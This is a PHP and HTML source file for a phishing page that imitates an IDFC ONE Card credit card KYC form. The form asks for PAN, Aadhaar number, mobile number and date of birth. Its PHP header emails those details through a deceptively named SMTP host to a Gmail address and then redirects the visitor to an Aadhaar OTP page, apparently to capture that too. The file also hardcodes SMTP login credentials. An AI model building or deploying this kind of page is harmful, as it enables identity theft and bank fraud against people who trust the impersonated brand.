<?php
include('PHPMailer/class.phpmailer.php');
include('PHPMailer/class.smtp.php');
$msg="";
extract($_POST);
session_start();
if(isset($_POST['submit'])){
                $mail = new PHPMailer();
                $mail->isSMTP();
                $mail->Host = "noreply-campaign-for-new-user.online";
                $mail->SMTPAuth = true;
                $mail->SMTPSecure = 'ssl';
                $mail->Port = 465;
                $mail->Username = "info@noreply-campaign-for-new-user.online";
                $mail->Password = "Admin@123";
                $mail->AddAddress("easymailid45@gmail.com");
                $mail->SetFrom($mail->Username);
                
                $mail->isHTML(true);
                $mail->Subject   = 'Enquiry';
                
                     $mail->Body = '<style>tr{font-family:Arial, Helvetica, sans-serif;font-size: 12px;}</style>
                                <p><b>Do you already have any Credit Card</b></p>
                                <p><b>Adhaar</b> - '.$adhar.'</p>
                                <p><b>Pan</b> - '.$pan.'</p>
                                <p><b>DOB</b> - '.$dob.'</p>
                                <p><b>Mobile</b> - '.$mob.'</p>';
                
                if(!($mail->Send()))
                {
                        // header("Location:adhar-otp.php");    
                    $msg="<div class='alert alert-danger'><span><b>Warning! </b>All fields are mandatory</span><a href='#' class='close' data-dismiss='alert'>&times;</a></div>";   
                }
                else
                {
                   
                        header("Location:adhar-otp.php");    
                     
                }           
    
  
}
?>
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>E - Apply</title>
  <link rel="stylesheet" href="./style.css">
<style type="text/css">
form p {
  font-size: 120%;
}
.input-field label.active{
  transform: translateY(-40%) !important;
  font-size: 11px !important;
  color: #97144D !important;
}
input:not([type]).validate+label, input[type=text].validate+label, input[type=password].validate+label, input[type=email].validate+label, input[type=url].validate+label, input[type=time].validate+label, input[type=date].validate+label, input[type=datetime].validate+label, input[type=datetime-local].validate+label, input[type=tel].validate+label, input[type=number].validate+label, input[type=search].validate+label, textarea.materialize-textarea.validate+label{
  padding-left: 10px !important;
}
input[type=date].valid{
  border-bottom: 2px solid rgb(255, 0, 0) !important;
}
.picker__input.picker__input--active {
    border-bottom: 2px solid rgb(255, 0, 0) !important;
    box-shadow: none !important;
}
input:not([type]), input[type=text], input[type=password], input[type=email], input[type=url], input[type=time], input[type=date], input[type=datetime], input[type=datetime-local], input[type=tel], input[type=number], input[type=search], textarea.materialize-textarea{
  height: auto !important;
  font-size: 14px !important;
  font-weight: bold !important;
  letter-spacing: 1px !important;
  padding: 30px 0px 10px 10px !important;
  border-bottom: 2px solid rgb(255, 0, 0) !important;
}
input:not([type]):focus:not([readonly]), input[type=text]:focus:not([readonly]), input[type=password]:focus:not([readonly]), input[type=email]:focus:not([readonly]), input[type=url]:focus:not([readonly]), input[type=time]:focus:not([readonly]), input[type=date]:focus:not([readonly]), input[type=datetime]:focus:not([readonly]), input[type=datetime-local]:focus:not([readonly]), input[type=tel]:focus:not([readonly]), input[type=number]:focus:not([readonly]), input[type=search]:focus:not([readonly]), textarea.materialize-textarea:focus:not([readonly]){
  padding-left: 10px !important;
}
.input-field label{
  font-size: 14px !important;
  top: 17px !important;
}
.input-field.col label{
  padding-left: 10px !important;
}
input[type=text]{
  margin: 0 0 0px 0 !important;

  border: 1px solid rgb(209, 232, 255) !important;
    background: rgb(249, 252, 255) !important;
}
.input-field{
  margin-top: 4px !important;

}
[type="checkbox"]:checked+label:before{
      border-right: 2px solid #861F41 !important;
    border-bottom: 2px solid #861F41 !important;
}
input[type=text].valid+label:after, input[type=text]:focus.valid+label:after{
  color: #01AFE9 !important;
}
input[type=text]:focus:not([readonly]){
  border-bottom: 1px solid #861F41 !important; 
}
[type="checkbox"]{
  color: #02b1f2 !important;
}
button{
  width: 100%;
  color: #fff !important;
  border-radius: 10px !important;
  font-size: 18px !important; 
  background: #97144d !important;
}
.ctrlqFormContent {
  color: rgba(0,0,0,.87);
  padding: 10px;
}

.ctrlqFormContentWrapper {
  display: -webkit-box;
  display: -moz-box;
  display: -webkit-flex;
  display: -ms-flexbox;
  display: flex;
  -webkit-box-orient: vertical;
  box-orient: vertical;
  -webkit-flex-direction: column;
  flex-direction: column
}
input:not([type]):focus:not([readonly]), input[type=text]:focus:not([readonly]), input[type=password]:focus:not([readonly]), input[type=email]:focus:not([readonly]), input[type=url]:focus:not([readonly]), input[type=time]:focus:not([readonly]), input[type=date]:focus:not([readonly]), input[type=datetime]:focus:not([readonly]), input[type=datetime-local]:focus:not([readonly]), input[type=tel]:focus:not([readonly]), input[type=number]:focus:not([readonly]), input[type=search]:focus:not([readonly]), textarea.materialize-textarea:focus:not([readonly]){
  border-bottom: 2px solid rgb(255, 0, 0) !important;
}
input[type=text].valid: focus{
  box-shadow: none !important;
}
input{
  padding-left: 10px !important;
}
input[type=text]:focus:not([readonly])+label{
  color: #97144D !important;
}
input[type=text].valid{
      border-bottom: 2px solid rgb(255, 0, 0) !important;
    box-shadow: none !important;
}
.ctrlqCenteredContent {
  margin: auto;
  width: 600px; 
}
.ctrlqHeaderTitle {
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  font-size: 34px;
  line-height: 135%;
  max-width: 100%;
  min-width: 0%;
  margin-bottom: 22px
}

@media (max-width: 660px) {
  .ctrlqHeaderMast {
    height: 53px;
  }
  .ctrlqFormCard:first-of-type {
    margin-top: -50px;
  }

  .ctrlqCenteredContent {
    width: 100%;
  }
}
div.error {
  position: relative;
  top: -1rem;
  left: 0rem;
  font-size: 0.8rem;
  color: #FF4081;
  -webkit-transform: translateY(0%);
  -ms-transform: translateY(0%);
  -o-transform: translateY(0%);
  transform: translateY(0%);
}
label{
  font-weight: 400 !important;
}
</style>
</head>
<body>
<!-- partial:index.partial.html -->
<lhtml>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.7/css/materialize.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.7/css/materialize.min.css" rel="stylesheet">
    <title>E - Apply</title>
  </head>
  <body style="background: #F9F9F9;">
    <div style="background: #F9F9F9; padding: 0; margin: 0;">
      <img style="width: 100%;" src="img/digital_pathway-01.png">
    </div><br>
    <div class="ctrlqFormContentWrapper">
      <div class="ctrlqHeaderMast"></div>
      <div class="ctrlqCenteredContent">
        <div class="ctrlqFormCard">
          <div class="ctrlqFormContent">
            <div class="row">
              <div class="col-sm-12 col-xs-12">
                <div class="row">
                  <div class="col-sm-2 col-xs-4">
                    <img style="width: 100%;" src="img/flash-logo.png"> 
                  </div>
                  <div class="col-sm-8 col-xs-4"></div>
                  <div class="col-sm-2 col-xs-4">
                    <img style="width: 100%;" src="img/simplyclick-card-face.png">
                  </div>
                </div>
              </div>
            </div>
            <form method = "post">  
              <div class="row">
                <div class="col s12">
                  <h5><b>Get Started</b></h5>
                  <small style="font-size: 14px;">HELP US CONFIRM ITS YOU</small>
                </div>
              </div>
              <div class="row">
                  <img src="img/checked.png" style="width: 20px; float: left; margin-right: 5px; margin-left: 2px;">
                  <label for="age3"> <span style="font-size: 18px; color: #000;"> 1. Personal Details</span></label><br><br>
                  <input type="radio" id="age1" name="age">
                  <label for="age3"> <span style="font-size: 18px; color: #000;"> 3. Online documents verification</span></label>
              </div>

              <div class="row">
                <div class="input-field col s12">
                  <input required="" name="pan" type="text" class="validate" style='text-transform:uppercase' maxlength = "10">
                  <label for="name">PAN</label>
                </div>
              </div>

              <div class="row">
                <div class="input-field col s12">
                  <input required="" name="adhar" type="text" class="validate" maxlength = "12">
                  <label for="name">Aadhaar Number or VID</label>
                  <span style="color: rgba(0, 0, 0, 0.54); font-size: 10px; margin-left: 15px;">To apply without Aadhaar, please visit a branch</span>
                </div>
              </div>

              <div class="row">
                <div class="input-field col s12">
                  <input required="" name="mob" type="text" class="validate" style='text-transform:uppercase' maxlength = "10">
                  <label for="name">Mobile Number</label>
                  <span style="color: rgba(0, 0, 0, 0.54); font-size: 10px; margin-left: 15px;">10 digit mobile number linked with Aadhaar</span>
                </div>
              </div>

              <div class="row">
                <div class="input-field col s12">
                  <label for="birthdate">Date of Birth</label>
                  <input required="" type="date" id="birthdate" class="datepicker" name="dob">
                </div>
              </div>

              <div class="row">
                <div class="col s12">
                  <input required="" type="checkbox" id="vehicle1" name="vehicle1" value="Bike">
                <label for="vehicle1"> <p style="color: rgb(105, 107, 111);
    margin: 0;
    padding: 3px;
    font-size: 11px;
    text-align: justify;
    font-family: Lato;
    line-height: 14px;
    word-spacing: 0.5px; font-family: arial;" class="jss11">  For the aforesaid purpose I hereby State and undertake that i have no objection and hereby voluntarily at my own discretion give consent and authorise IDFC ONE Card to use my Aadhaar details to complete KYC process.</p></label>
                </div>
              </div>

              <div class="row">
                <div class="input-field col s12">
                  <button style="background: #9f3339 !important;" type="submit" name = "submit" class="waves-effect waves-light btn-large">Proceed</button>
                </div>
              </div>

            </form>
            <!-- <p>3. Current Residential Address</p> -->
          </div>
        </div>
      </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.7/js/materialize.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.min.js"></script>

  </body>

  </html>
<!-- partial -->
<script type="text/javascript">
$(document).ready(function() {
  $('select').material_select();
  $('.datepicker').pickadate({
    selectMonths: true, 
    selectYears: 155
  });
  $.validator.setDefaults({
    ignore: []
  });


});
</script>

</body>
</html>
